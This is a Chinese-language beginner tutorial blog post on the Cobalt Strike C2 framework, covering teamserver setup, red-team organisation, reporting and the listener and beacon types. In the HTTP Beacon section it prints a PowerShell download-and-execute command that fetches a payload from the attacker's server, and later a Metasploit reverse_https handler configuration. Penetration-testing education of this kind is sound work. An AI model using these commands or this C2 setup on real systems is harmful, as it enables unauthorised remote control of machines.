# Cobalt Strike Basic No.1


体系化总结一下Cobalt Strike的基本知识和使用，主要面向新手，希望可以快速上手该工具，建立系统化知识结构。

<!--more-->

## 一、基础操作

### 简介

Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。

Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。

![image-20240222143954956](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png)

### 组织结构

Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。

文件目录结构如下：

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1]
└─$ tree -L 2 .
.
├── Client
│   ├── cobaltstrike.auth
│   ├── cobaltstrike-client.cmd		-- Windows client启动文件
│   ├── cobaltstrike-client.jar		-- client启动jar文件
│   ├── cobaltstrike-client.sh		-- Linux/MacOS client启动文件
│   └── uHook.jar							
└── Server
    ├── c2lint				-- 检查profile的错误和异常
    ├── cobaltstrike.auth
    ├── cobaltstrike.store              -- server和client加密通信的证书
    ├── data
    ├── downloads                       -- 文件下载目录
    ├── logs                            -- 日志目录
    ├── screenshots                     -- 截图目录
    ├── source-common.sh
    ├── teamserver			-- server启动脚本
    ├── TeamServerImage			-- 实际的启动elf文件
    └── third-party		        -- 第三方工具
```



### 连接方式

Cobalt Strike的client想要连接server需要知道三个信息：

- server的外部ip地址
- serve的连接密码
- (optional)决定malleable C2工具的哪一个配置文件用于server

#### 开启server

开启server的常规命令如下（Linux环境）：

```shell
./teamserver your_ip your_password [config_file]


┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Server]
└─$ sudo ./teamserver 172.16.86.138 v4ler1an
[sudo] password for v4ler1an:

[*] Will use existing X509 certificate and keystore (for SSL)

[*] Starting teamserver
[*] Team Server Version: 4.9.1 (Pwn3rs)
[*] Setting 'https.protocols' system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
... ...
[+] Team server is up on 0.0.0.0:50050
[*] SHA256 hash of SSL cert is: xxxx
[+] Listener: test started!
```

#### client连接server

client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/CobaltSrike_4.9.1/Client]
└─$ ls
cobaltstrike.auth  cobaltstrike-client.cmd  cobaltstrike-client.jar  cobaltstrike-client.sh  uHook.jar
```

直接运行对应的文件即可。

![image-20240222142725955](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png)

点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面：

![image-20240222142904061](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png)

成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。

#### client连接不同的server

Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。

连接不同的server，在client的左上角的+号，输入server信息即可连接：

![image-20240222145413463](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png)

![image-20240222145445280](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png)

此时在最下方就会有多个server连接的切换条。

### 分布式协作

这里以最基本的团队模型为例，涉及三个server：

- Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。
- Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。
- Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。

#### 可伸缩红队操作模型

Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。

目标单元的工作：

- 负责具体目标或行动的对象
- 获得访问权限、后渗透、横向移动
- 维护本地基础设施

访问管理单元的工作：

- 保持所有目标网络的访问权限
- 获取访问权限并接收来自单元的访问
- 根据需要传递对目标单元的访问
- 为持续回调保持全局基础环境

#### 团队角色

- 初始渗透人员，主要任务是进入目标系统，并扩大立足点
- 后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息
- 权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话

### 日志与报告

#### 日志记录

Cobalt Strike的日志文件在团队服务器下的运行目录中的`logs`文件夹内，其中有些日志文件名例如`beacon_11309.log`，这里的`11309`就是beacon会话的ID。

按键的日志在`keystrokes`文件夹内，截屏的日志在`screenshots`文件夹内，截屏的日志名称一般如`screen_015321_4826.jpg`类似，其中`015321`表示时间（1点53分21秒），`4826`表示ID。

#### 导出报告

Cobalt Strike生成报告的目的在于培训或帮助蓝队，在`Reporting`菜单栏中就可以生成报告，关于生成的报告有以下特点：

- 输出格式为PDF或者Word格式
- 可以输出自定义报告并且更改图标（Cobalt Strike –> Preferences –>Reporting）
- 可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。

#### 报告类型

![image-20240222153927259](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png)

- 活动报告（Activity Report）

  提供红队活动的时间表，记录了每个后渗透活动。

- 主机报告（Hosts Report）

  汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。

- 入侵指标报告（Indicators of Compromise）

  包括对C2扩展文件的分析、使用的域名和上传文件的md5。

- 会话报告（Sessions Report）

  记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。

- 社工报告（Social Engineering Report）

  记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。

- TTP报告（Tactics，Techniques，and Procedures）

  将自己的CS行动与ATT&CK矩阵进行映射，给出具体的ttp。

## 二、基础设施

### Listener管理

定义：等待受害目标回连自己的一个服务。

作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。

一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成：

```shell
// 操作系统/攻击载荷/传输器
Operating System/Payload/Stager


example:
windows/beacon_http/reverse_http
```

#### Stager

payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。

stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。

为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。

#### 创建Listener

在CS的client中打开Cobalt Strike -> Listeners，之后点击下方的Add，弹出New Listener窗口：

![image-20240222173802492](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png)

CS的listener目前有三种类型：

- Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下：

  ```shell
  windows/beacon_http/reverse_http
  ```

- Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener：

  ```shell
  windows/foregin/reverse_https
  ```

- External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。

![image-20240222173926470](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png)

### HTTP和HTTPS Beacon

**Beacon**

- Beacon是CS的Payload
- Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。
- 通过HTTP、HTTPS和DNS出口网络
- 使用SMB协议的时候是点对点通信
- Beacon有很多的后渗透攻击模块和远程管理工具

**Beacon的类型**

- HTTP 和 HTTPS Beacon HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。

```
  windows/beacon_http/reverse_http
  windows/beacon_https/reverse_https
```

- DNS Beacon

```
  windows/beacon_dns/reverse_dns_txt
  windows/beacon_dns/reverse_http
```

- SMB Beacon SMB Beacon也可以叫做pipe beacon

```
  windows/beacon_smb/bind_pipe
```

**创建HTTP Beacon**

点击 Cobalt Strike –> Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save。

![image-20240223110739474](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231107596.png)

测试一下刚才设置的监听器，点击Attack –> Web Drive-by –> Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，最后点击Launch:

![image-20240223111429362](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231114442.png)

![image-20240223110840913](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231108981.png)

复制弹窗中的命令到靶机中执行：

```powershell
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.86.138:80/test'))"
```

![image-20240223111527176](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231115256.png)

回到CS，靶机已经上线：

![image-20240223111606515](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231116605.png)

![image-20240223111800363](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231118446.png)

**HTTPS Beacon**

HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：https://www.cobaltstrike.com/help-malleable-c2#validssl。

### DNS Beacon

使用DNS请求将Beacon返回。这些DNS请求用于解析由你的CS团队服务器作为权威DNS服务器的域名。DNS响应告诉Beacon休眠或是连接到团队服务器来下载任务，DNS响应也告诉 Beacon 如何从你的团队服务器下载任务。

在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。

DNS Beacon的工作流程具体如下：

首先，CS服务器向目标发起攻击，将DNS Beacon传输器嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器回连下载CS服务器上的DNS Beacon传输体，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。

![image-20240223161626900](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231616992.png)

原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。

根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。

**域名配置**

既然是配置域名，所以就需要先有个域名，添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。然后服务器配置防火墙将UDP的53端口放通。（这里我没有多余的服务器和域名，借用eastjun师傅的图）

![image-20211202223623912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124025.png)

配置完可以使用nslookup进行测试

![image-20211202224423180](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124031.png)

CS中创建监听器时填写NS记录的域名：

![image-20211202223356738](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124673.png)

靶机上线后不会像其他Beacon一样在第一次连接时就发送目标相关信息，在没有任务的情况下CS服务器都是简单响应DNS请求而不做任何操作，在执行任何一条命令之后靶机会将目标相关信息提交过来。

![image-20211202225129950](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402231124991.png)

### SMB Beacon

SMB Beacon使用命名管道通过一个父Beacon进行通信，这种对等通信对同一台主机上的Beacon和跨网络的Beacon都有效。Windows将命名管道通信封装仔SMB协议中，因此得名SMB Beacon。

因为使用SMB协议通信，Windows的系统防火墙默认放通445端口，所以SMB Beacon在绕防火墙时可能会有意外作用。

![img](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271913214.png)

**SMB Beacon配置**

首先需要一个上线的主机，上线后新建一个SMB Beacon，输入listener名称，选择Beacon SMB，pipename使用默认值即可：

![image-20240227191613502](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271916564.png)

然后在初始beacon中迁移到smb beacon：

![image-20240227191819912](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271918975.png)

迁移完成后：

![image-20240227191913542](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271919603.png)

可以看到派生的SMB Beacon，在external的ip后有个`∞∞`字符。此时SMB Beacon通过父级的HTTPS Beacon与CS服务器进行通信，而SMB Beacon与HTTPS Beacon通过SMB协议进行通信。

![image-20240227192123585](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271921658.png)

随后，我们把SMB Beacon注入到一个进程中：

![image-20240227192323558](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271923150.png)

注入完成后，SMB Beacon就转变为对应进程派生的beacon了：

![image-20240227192530624](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271925697.png)

如果需要断开和某个会话的连接，使用unlink命令即可，想再次连上使用link就可以。

### TCP Beacon

TCP Beacon与SMB Beacon类似，区别在于使用的是TCP协议与父级Beacon进行通信，使用这种方式上线时流量时不加密的。

在新建tcp beacon时可以指定监听的端口，假设为8888，在不出网的目标主机上执行后，目标主机会监听8888端口，然后父Beacon中使用connect命令进行连接：

![image-20220213210419805](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271944597.png)

### Foreign Beacon

使用CS的Foreign Beacon可以派生到meterpreter会话，有http和https两种监听器。

首先在msf中起一个监听器：

```shell
msf > use exploit/multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(handler) > set lhost 10.211.55.2
lhost => msf ip
msf exploit(handler) > set lport 4444
lport => 4444
msf exploit(handler) > exploit
```

然后在cs里配置，填上msf的ip和监听端口。

然后选择会话右键派生，会话选择forign beacon：

![image-20240227195131535](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271951624.png)

随后在msf中就会接收到会话：

![image-20240227195228315](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402271952409.png)


